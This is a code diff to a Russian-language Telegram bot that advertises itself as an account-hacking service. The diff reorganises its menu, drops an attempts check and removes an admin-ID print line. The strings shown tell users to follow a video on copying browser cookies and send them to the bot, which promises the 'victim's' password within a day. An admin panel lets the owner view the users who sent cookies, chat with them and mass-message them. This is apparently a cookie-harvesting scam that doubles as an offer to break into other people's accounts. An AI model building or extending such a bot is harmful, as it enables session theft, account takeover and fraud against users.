@@ -475,6 +475,44 @@ async def show_keyword_messages_page(query, context, page=0, per_page=10):
     await query.edit_message_text(text, reply_markup=reply_markup)
 
 # ===================================================
+# ГЛАВНОЕ МЕНЮ
+# ===================================================
+
+def get_main_menu(user_id):
+    keyboard = [
+        [
+            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
+            InlineKeyboardButton("Инструкция", callback_data="cookies"),
+        ],
+        [
+            InlineKeyboardButton("Поддержка", callback_data="support"),
+            InlineKeyboardButton("🎯 Мои попытки", callback_data="my_attempts"),
+        ],
+        [
+            InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend"),
+        ]
+    ]
+    
+    if user_id == YOUR_USER_ID:
+        keyboard.append([
+            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
+            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
+            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+            InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
+        ])
+    
+    return keyboard
+
+# ===================================================
 # ОБРАБОТЧИК КОМАНДЫ /start
 # ===================================================
 
@@ -544,40 +582,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-def get_main_menu(user_id):
-    keyboard = [
-        [
-            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
-            InlineKeyboardButton("Инструкция", callback_data="cookies"),
-        ],
-        [
-            InlineKeyboardButton("Поддержка", callback_data="support"),
-            InlineKeyboardButton("🎯 Мои попытки", callback_data="my_attempts"),
-        ],
-        [
-            InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend"),
-        ]
-    ]
-    
-    if user_id == YOUR_USER_ID:
-        keyboard.append([
-            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
-            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
-        ])
-        keyboard.append([
-            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
-            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
-        ])
-        keyboard.append([
-            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
-            InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
-        ])
-        keyboard.append([
-            InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
-        ])
-    
-    return keyboard
-
 # ===================================================
 # ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
 # ===================================================
@@ -590,7 +594,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
     
-    print(f"🔘 Нажата кнопка: {data} от пользователя {user_id}")  # Для отладки
+    print(f"🔘 Нажата кнопка: {data}")  # Для отладки
     
     # --- НОВЫЕ КНОПКИ ---
     if data == "my_attempts":
@@ -710,13 +714,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Отправляем видео с кнопками
+        # Отправляем видео
         await query.message.reply_video(
             video="https://t.me/cookieeditort/3",
             caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
-        # Удаляем сообщение с выбором устройства
         await query.delete_message()
         return
     
@@ -738,20 +741,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "cookies_copied":
-        # Проверяем попытки
-        if get_available_attempts(user_id) <= 0:
-            await query.edit_message_text(
-                "❌ У вас закончились попытки!\n\n"
-                "💡 Пригласите друга и получите +1 попытку!"
-            )
-            return
-        
         await query.edit_message_text(
             "✅ Отлично!\n\n"
             "📋 Теперь отправьте cookie в бота\n"
             "Бот начнет поиск пароля вашей жертвы 😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта\n\n"
-            f"🎯 У вас осталось {get_available_attempts(user_id)} попыток"
+            "В течении дня бот скинет вам пароль от аккаунта"
         )
         return
     
@@ -1303,7 +1297,6 @@ def main():
     print("🤖 Бот запущен!")
     print("✅ Попытки тратятся ТОЛЬКО при отправке ключевого слова")
     print("✅ 2 бесплатные попытки + 1 за приглашение")
-    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
     app.run_polling()
 
 if __name__ == "__main__":
